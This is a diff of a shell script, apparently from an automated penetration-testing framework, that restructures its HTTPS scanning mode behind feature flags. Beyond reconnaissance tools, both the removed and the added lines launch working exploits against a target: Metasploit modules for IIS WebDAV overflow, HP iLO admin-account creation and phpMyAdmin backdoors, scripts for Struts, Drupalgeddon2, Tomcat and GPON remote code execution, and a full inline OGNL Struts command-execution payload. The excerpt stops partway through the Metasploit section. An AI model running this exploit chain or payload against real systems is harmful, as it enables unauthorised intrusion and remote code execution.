@@ -73,208 +73,320 @@ if [ "$MODE" = "webporthttps" ]; then
     echo -e "$OKRED + -- --=[Port $PORT closed... skipping.$RESET"
   else
     echo -e "$OKORANGE + -- --=[Port $PORT opened... running tests...$RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED CHECKING FOR WAF $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    wafw00f https://$TARGET:$PORT | tee $LOOT_DIR/web/waf-$TARGET-https-$PORT 2> /dev/null
-    echo ""
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED GATHERING HTTP INFO $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    whatweb -a 3 https://$TARGET:$PORT | tee $LOOT_DIR/web/whatweb-$TARGET-https-$PORT 2> /dev/null
-    echo ""
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED GATHERING SERVER INFO $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    python3 $PLUGINS_DIR/wig/wig.py -d -q -t 50 https://$TARGET | tee $LOOT_DIR/web/wig-$TARGET-https
-    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/wig-$TARGET-https > $LOOT_DIR/web/wig-$TARGET-https.txt 2> /dev/null
+    if [ "$WAFWOOF" == "1" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED CHECKING FOR WAF $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      wafw00f https://$TARGET:$PORT | tee $LOOT_DIR/web/waf-$TARGET-https-port$PORT.txt 2> /dev/null
+      echo ""
+    fi
+    if [ "$WHATWEB" == "1" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED GATHERING HTTP INFO $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      whatweb -a 3 https://$TARGET:$PORT | tee $LOOT_DIR/web/whatweb-$TARGET-https-port$PORT.raw  2> /dev/null
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/whatweb-$TARGET-https-port$PORT.raw > $LOOT_DIR/web/whatweb-$TARGET-https-port$PORT.txt 2> /dev/null
+      rm -f $LOOT_DIR/web/whatweb-$TARGET-https-port$PORT.raw 2> /dev/null
+      echo ""
+    fi
+    if [ "$WIG" == "1" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED GATHERING SERVER INFO $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      python3 $PLUGINS_DIR/wig/wig.py -d -q https://$TARGET:$PORT | tee $LOOT_DIR/web/wig-$TARGET-https-$PORT
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/wig-$TARGET-https-$PORT > $LOOT_DIR/web/wig-$TARGET-https-$PORT.txt 2> /dev/null
+    fi
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED CHECKING HTTP HEADERS AND METHODS $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    wget -qO- -T 1 --connect-timeout=3 --read-timeout=3 --tries=1 https://$TARGET |  perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' >> $LOOT_DIR/web/title-https-$TARGET.txt 2> /dev/null
-    curl --connect-timeout 3 -I -s -R https://$TARGET | tee $LOOT_DIR/web/headers-https-$TARGET.txt 2> /dev/null
+    wget -qO- -T 1 --connect-timeout=5 --read-timeout=5 --tries=1 https://$TARGET:$PORT |  perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' >> $LOOT_DIR/web/title-https-$TARGET-$PORT.txt 2> /dev/null
+    curl --connect-timeout 5 -I -s -R https://$TARGET:$PORT | tee $LOOT_DIR/web/headers-https-$TARGET-$PORT.txt 2> /dev/null
+    curl --connect-timeout 5 -I -s -R -L https://$TARGET:$PORT | tee $LOOT_DIR/web/websource-https-$TARGET-$PORT.txt 2> /dev/null
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED DISPLAYING META GENERATOR TAGS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    cat $LOOT_DIR/web/websource-https-$TARGET-$PORT.txt 2> /dev/null | grep generator | cut -d\" -f4 2> /dev/null | tee $LOOT_DIR/web/webgenerator-https-$TARGET-$PORT.txt 2> /dev/null
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED DISPLAYING COMMENTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    cat $LOOT_DIR/web/websource-https-$TARGET-$PORT.txt 2> /dev/null | grep "<\!\-\-" 2> /dev/null | tee $LOOT_DIR/web/webcomments-https-$TARGET-$PORT.txt 2> /dev/null
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED DISPLAYING SITE LINKS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    cat $LOOT_DIR/web/websource-https-$TARGET-$PORT.txt 2> /dev/null | egrep "\"" | cut -d\" -f2 | grep  \/ | sort -u 2> /dev/null | tee $LOOT_DIR/web/weblinks-https-$TARGET-$PORT.txt 2> /dev/null
     if [ "$SSL" = "1" ]; then
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED GATHERING SSL/TLS INFO $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
-      sslyze --regular $TARGET | tee $LOOT_DIR/web/sslyze-$TARGET.txt 2> /dev/null
-      sslscan --no-failed $TARGET | tee $LOOT_DIR/web/sslscan-$TARGET.raw 2> /dev/null
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/sslscan-$TARGET.raw > $LOOT_DIR/web/sslscan-$TARGET.txt 2> /dev/null
+      sslscan --no-failed $TARGET:$PORT | tee $LOOT_DIR/web/sslscan-$TARGET-$PORT.raw 2> /dev/null
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/sslscan-$TARGET-$PORT.raw > $LOOT_DIR/web/sslscan-$TARGET-$PORT.txt 2> /dev/null
+      rm -f $LOOT_DIR/web/sslscan-$TARGET-$PORT.raw 2> /dev/null
       echo ""
     fi
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED SAVING SCREENSHOTS $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     if [ ${DISTRO} == "blackarch"  ]; then
-      /bin/CutyCapt --url=https://$TARGET:$PORT --out=$LOOT_DIR/screenshots/$TARGET-port$PORT.jpg --insecure --max-wait=10000 2> /dev/null
+      /bin/CutyCapt --url=https://$TARGET:$PORT --out=$LOOT_DIR/screenshots/$TARGET-port$PORT.jpg --insecure --max-wait=5000 2> /dev/null
     else
-      cutycapt --url=https://$TARGET:$PORT --out=$LOOT_DIR/screenshots/$TARGET-port$PORT.jpg --insecure --max-wait=10000 2> /dev/null
+      cutycapt --url=https://$TARGET:$PORT --out=$LOOT_DIR/screenshots/$TARGET-port$PORT.jpg --insecure --max-wait=5000 2> /dev/null
     fi
     echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port$PORT.jpg"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    nmap -A -sV -T5 -Pn -p $PORT --script=http-vuln* $TARGET
-    if [ "$PASSIVE_SPIDER" = "1" ]; then
+    if [ "$BURP_SCAN" == "1" ]; then
+        echo -e "${OKGREEN}====================================================================================${RESET}"
+        echo -e "$OKRED RUNNING BURPSUITE SCAN $RESET"
+        echo -e "${OKGREEN}====================================================================================${RESET}"
+        if [ "$VERBOSE" == "1" ]; then
+          echo -e "$OKBLUE[$RESET${OKRED}i${RESET}$OKBLUE]$OKGREEN curl -X POST \"http://$BURP_HOST:$BURP_PORT/v0.1/scan\" -d \"{\"scope\":{\"include\":[{\"rule\":\"https://$TARGET:$PORT\"}],\"type\":\"SimpleScope\"},\"urls\":[\"https://$TARGET:$PORT\"]}\"$RESET"
+        fi
+        curl -s -X POST "http://$BURP_HOST:$BURP_PORT/v0.1/scan" -d "{\"scope\":{\"include\":[{\"rule\":\"https://$TARGET:$PORT\"}],\"type\":\"SimpleScope\"},\"urls\":[\"https://$TARGET:$PORT\"]}"
+        echo ""
+    fi
+    if [ "$NMAP_SCRIPTS" == "1" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      nmap -A -Pn -T5 -p $PORT -sV --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-vuln* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port$PORT
+      sed -r "s/</\&lh\;/g" $LOOT_DIR/output/nmap-$TARGET-port$PORT 2> /dev/null > $LOOT_DIR/output/nmap-$TARGET-port$PORT.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/nmap-$TARGET-port$PORT 2> /dev/null
+    fi
+    if [ "$PASSIVE_SPIDER" == "1" ]; then
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING PASSIVE WEB SPIDER $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
-      curl -sX GET "http://index.commoncrawl.org/CC-MAIN-2018-22-index?url=*.$TARGET&output=json" | jq -r .url | sort -u | tee $LOOT_DIR/web/spider-$TARGET.txt 2> /dev/null
+      curl -sX GET "http://index.commoncrawl.org/CC-MAIN-2018-22-index?url=*.$TARGET&output=json" | jq -r .url | tee $LOOT_DIR/web/passivespider-$TARGET.txt 2> /dev/null
     fi
-
+    if [ "$WAYBACKMACHINE" == "1" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED FETCHING WAYBACK MACHINE URLS $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      curl -sX GET "http://web.archive.org/cdx/search/cdx?url=*.$TARGET/*&output=text&fl=original&collapse=urlkey" | tee $LOOT_DIR/web/waybackurls-$TARGET.txt 2> /dev/null
+    fi
     if [ "$BLACKWIDOW" == "1" ]; then
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING ACTIVE WEB SPIDER & APPLICATION SCAN $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
-      blackwidow -u https://$TARGET -l 3 -s y 2> /dev/null
-      cat /usr/share/blackwidow/$TARGET*/* > $LOOT_DIR/web/spider-$TARGET.txt 2>/dev/null
+      blackwidow -u https://$TARGET:$PORT -l 3 -s y -v n 2> /dev/null
+      cat /usr/share/blackwidow/$TARGET*/* 2> /dev/null > $LOOT_DIR/web/spider-$TARGET.txt 2>/dev/null
+      cat $LOOT_DIR/web/waybackurls-$TARGET.txt 2> /dev/null >> $LOOT_DIR/web/spider-$TARGET.txt 2>/dev/null
+      cat $LOOT_DIR/web/passivespider-$TARGET.txt 2> /dev/null >> $LOOT_DIR/web/spider-$TARGET.txt 2>/dev/null
     fi
-
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING FILE/DIRECTORY BRUTE FORCE $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    python3 $PLUGINS_DIR/dirsearch/dirsearch.py -u https://$TARGET:$PORT -w $WEB_BRUTE_INSANE -x 400,403,404,405,406,429,502,503,504 -F -e php,asp,aspx,bak,zip,tar.gz,html,htm 
+    if [ "$WEB_BRUTE_COMMON" == "1" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING COMMON FILE/DIRECTORY BRUTE FORCE $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      python3 $PLUGINS_DIR/dirsearch/dirsearch.py -u https://$TARGET:$PORT -w $WEB_BRUTE_COMMON -x 400,403,404,405,406,429,502,503,504 -F -e php,asp,aspx,jsp,pl,cgi,js,css,txt,html,htm
+    fi
+    if [ "$WEB_BRUTE_FULLSCAN" == "1" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING FULL FILE/DIRECTORY BRUTE FORCE $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      python3 $PLUGINS_DIR/dirsearch/dirsearch.py -u https://$TARGET:$PORT -w $WEB_BRUTE_FULL -x 400,403,404,405,406,429,502,503,504 -F -e php,asp,aspx,jsp,pl,cgi,js,css,txt,html,htm
+    fi
+    if [ "$WEB_BRUTE_EXPLOITSCAN" == "1" ]; then
+        echo -e "${OKGREEN}====================================================================================${RESET}"
+        echo -e "$OKRED RUNNING FILE/DIRECTORY BRUTE FORCE FOR VULNERABILITIES $RESET"
+        echo -e "${OKGREEN}====================================================================================${RESET}"
+        python3 $PLUGINS_DIR/dirsearch/dirsearch.py -u https://$TARGET:$PORT -w $WEB_BRUTE_EXPLOITS -x 400,403,404,405,406,429,502,503,504 -F -e html 
+    fi
     cat $PLUGINS_DIR/dirsearch/reports/$TARGET/* 2> /dev/null
     cat $PLUGINS_DIR/dirsearch/reports/$TARGET/* > $LOOT_DIR/web/dirsearch-$TARGET.txt 2> /dev/null
     wget https://$TARGET:$PORT/robots.txt -O $LOOT_DIR/web/robots-$TARGET:$PORT-https.txt 2> /dev/null
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    clusterd --ssl -i $TARGET -p $PORT 2> /dev/null
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING WORDPRESS VULNERABILITY SCAN $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    wpscan --url https://$TARGET:$PORT --disable-tls-checks
-    echo ""
-    wpscan --url https://$TARGET:$PORT/wordpress/ --disable-tls-checks
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING CMSMAP $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    cmsmap https://$TARGET:$PORT
-    echo ""
-    cmsmap https://$TARGET:$PORT/wordpress/
-    echo ""
-    if [ "$NIKTO" = "1" ]; then
+    if [ "$CLUSTERD" == "1" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      clusterd --ssl -i $TARGET -p $PORT 2> /dev/null | tee $LOOT_DIR/web/clusterd-$TARGET-port$PORT.txt
+    fi
+    if [ "$CMSMAP" == "1" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING CMSMAP $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      cmsmap https://$TARGET:$PORT | tee $LOOT_DIR/web/cmsmap-$TARGET-http-port$PORTa.txt
+      echo ""
+      cmsmap https://$TARGET:$PORT/wordpress/ | tee $LOOT_DIR/web/cmsmap-$TARGET-http-port$PORTb.txt
+      echo ""
+    fi
+    if [ "$WPSCAN" == "1" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING WORDPRESS VULNERABILITY SCAN $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      wpscan --url https://$TARGET:$PORT --no-update --disable-tls-checks 2> /dev/null | tee $LOOT_DIR/web/wpscan-$TARGET-http-port$PORTa.txt
+      echo ""
+      wpscan --url https://$TARGET:$PORT/wordpress/ --no-update --disable-tls-checks 2> /dev/null | tee $LOOT_DIR/web/wpscan-$TARGET-http-port$PORTb.txt
+    fi
+    if [ "$NIKTO" == "1" ]; then
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING WEB VULNERABILITY SCAN $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
-      nikto -h https://$TARGET:$PORT -output $LOOT_DIR/web/nikto-$TARGET-https-$PORT.txt
+      nikto -h https://$TARGET:$PORT -output $LOOT_DIR/web/nikto-$TARGET-https-port$PORT.txt
+    fi
+    if [ "$SHOCKER" == "1" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING SHELLSHOCK EXPLOIT SCAN $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --ssl --port $PORT | tee $LOOT_DIR/web/shocker-$TARGET-port$PORT.txt
+    fi
+    if [ "$JEXBOSS" == "1" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING JEXBOSS $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      cd /tmp/
+      python /usr/share/sniper/plugins/jexboss/jexboss.py -u https://$TARGET:$PORT | tee $LOOT_DIR/web/jexboss-$TARGET-port$PORT.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/jexboss-$TARGET-port$PORT.raw > $LOOT_DIR/web/jexboss-$TARGET-port$PORT.txt 2> /dev/null
+      rm -f $LOOT_DIR/web/jexboss-$TARGET-port$PORT.raw 2> /dev/null
+      cd $INSTALL_DIR
     fi
     cd $INSTALL_DIR
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING HTTP PUT UPLOAD SCANNER $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use scanner/http/http_put; setg RHOSTS "$TARGET"; setg RPORT "443"; setg SSL true; run; set PATH /uploads/; run; exit;"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING WEBDAV SCANNER $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use scanner/http/webdav_scanner; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL true; run; use scanner/http/webdav_website_content; run; exit;"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING MICROSOFT IIS WEBDAV ScStoragePathFromUrl OVERFLOW $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; setg RHOST "$TARGET"; setg RPORT "$PORT"; setg SSL true; run; exit;"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING APACHE TOMCAT UTF8 TRAVERSAL EXPLOIT $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use admin/http/tomcat_utf8_traversal; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING APACHE OPTIONS BLEED EXPLOIT $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use scanner/http/apache_optionsbleed; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING HP ILO AUTH BYPASS EXPLOIT $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING MS15-034 SYS MEMORY DUMP METASPLOIT EXPLOIT $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS \"$TARGET\"; set RPORT "$PORT"; set SSL true; set WAIT 2; run; exit;"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING BADBLUE PASSTHRU METASPLOIT EXPLOIT $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use exploit/windows/http/badblue_passthru; setg RHOST \"$TARGET\"; set RPORT "$PORT"; set SSL true; run; back; exit;"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING PHP CGI ARG INJECTION METASPLOIT EXPLOIT $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use exploit/multi/http/php_cgi_arg_injection; setg RHOST \"$TARGET\"; set RPORT "$PORT"; set SSL true; run; back; exit;"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING JOOMLA COMFIELDS SQL INJECTION METASPLOIT EXPLOIT $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use unix/webapp/joomla_comfields_sqli_rce; setg RHOST \"$TARGET\"; set RPORT "$PORT"; set SSL true; run; back; exit;"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOIT $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT "$PORT"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING SHELLSHOCK EXPLOIT SCAN $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port $PORT
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING APACHE STRUTS 2 CVE-2017-5638 $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    python $INSTALL_DIR/bin/apache_struts_cve-2017-5638.py -u https://$TARGET:$PORT
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING APACHE STRUTS 2 CVE-2017-9805 $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    python $INSTALL_DIR/bin/apache_struts_cve-2017-9805.py -u https://$TARGET:$PORT
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING APACHE JAKARTA RCE EXPLOIT $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    curl -s -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" https://$TARGET:$PORT | head -n 1
-    echo -e "$OKRED RUNNING APACHE STRUTS 2 CVE-2018-11776 RCE EXPLOIT $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    python $INSTALL_DIR/bin/apache-struts-CVE-2018-11776.py -u https://$TARGET:$PORT
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING DRUPALGEDDON2 CVE-2018-7600 $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    ruby $INSTALL_DIR/bin/drupalgeddon2.rb https://$TARGET:$PORT 
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING CISCO ASA TRAVERSAL CVE-2018-0296 $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    python $INSTALL_DIR/bin/cisco-asa-traversal.py https://$TARGET:$PORT
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING JEXBOSS $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    cd /tmp/
-    python /usr/share/sniper/plugins/jexboss/jexboss.py -u https://$TARGET:$PORT 
-    cd $INSTALL_DIR
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING GPON ROUTER EXPLOIT $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    python $INSTALL_DIR/bin/gpon_rce.py https://$TARGET:$PORT 'whoami'
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING APACHE TOMCAT CVE-2017-12617 RCE EXPLOIT $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    python $INSTALL_DIR/bin/tomcat-cve-2017-12617.py -u https://$TARGET:$PORT
-
-    if [ $SCAN_TYPE == "DOMAIN" ] && [ $OSINT == "1" ];
-    then
-      if [ -z $GHDB ];
-      then
-        if [ $OSINT == "0" ]; then
-          echo -e "${OKGREEN}====================================================================================${RESET}"
-          echo -e "$OKRED SKIPPING GOOGLE HACKING QUERIES $RESET"
-          echo -e "${OKGREEN}====================================================================================${RESET}"
-        else
-          echo -e "${OKGREEN}====================================================================================${RESET}"
-          echo -e "$OKRED RUNNING GOOGLE HACKING QUERIES $RESET"
-          echo -e "${OKGREEN}====================================================================================${RESET}"
-          goohak $TARGET > /dev/null
-        fi
-        echo -e "${OKGREEN}====================================================================================${RESET}"
-        echo -e "$OKRED RUNNING INURLBR OSINT QUERIES $RESET"
-        echo -e "${OKGREEN}====================================================================================${RESET}"
-        php $INURLBR --dork "site:$TARGET" -s inurlbr-$TARGET.txt
-        rm -Rf output/ cookie.txt exploits.conf
-      fi
+    if [ "$METASPLOIT_EXPLOIT" == "1" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING HTTP PUT UPLOAD SCANNER $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use scanner/http/http_put; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set SSL true; setg SSL false; run; set PATH /uploads/; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING WEBDAV SCANNER $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use scanner/http/webdav_scanner; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set SSL true; setg SSL false; run; use scanner/http/webdav_website_content; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING MICROSOFT IIS WEBDAV ScStoragePathFromUrl OVERFLOW $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; setg SSL false; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING APACHE TOMCAT UTF8 TRAVERSAL EXPLOIT $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use admin/http/tomcat_utf8_traversal; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set SSL true; set SSL false; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_utf8_traversal.raw
